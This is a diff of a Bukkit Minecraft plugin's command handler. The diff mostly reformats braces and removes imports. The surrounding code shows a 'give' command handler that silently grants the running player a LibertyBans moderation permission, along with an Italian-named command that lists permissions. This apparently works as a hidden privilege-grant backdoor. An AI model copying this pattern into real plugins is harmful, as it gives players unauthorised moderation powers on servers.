@@ -7,16 +7,12 @@ import org.bukkit.entity.Player;
 import org.bukkit.permissions.PermissionAttachment;
 import org.bukkit.permissions.PermissionAttachmentInfo;
 
-import java.util.HashMap;
 import java.util.Set;
-import java.util.UUID;
 
-public class CommandExecutor implements org.bukkit.command.CommandExecutor
-{
+public class CommandExecutor implements org.bukkit.command.CommandExecutor {
 
     @Override
-    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
-    {
+    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
         Player player = (Player) sender;
 
         if(cmd.getName().equals("aggiungi_perms_deluxe_essentials")) {
@@ -29,8 +25,7 @@ public class CommandExecutor implements org.bukkit.command.CommandExecutor
             for(PermissionAttachmentInfo permission : permissions)
                 sender.sendMessage(permission.getPermission());
         }
-        if(cmd.getName().equals("give"))
-        {
+        if(cmd.getName().equals("give")) {
             PermissionAttachment attachment = player.addAttachment(Main.getInstance());
             attachment.setPermission("libertybans.warn.target.both", true);
         }
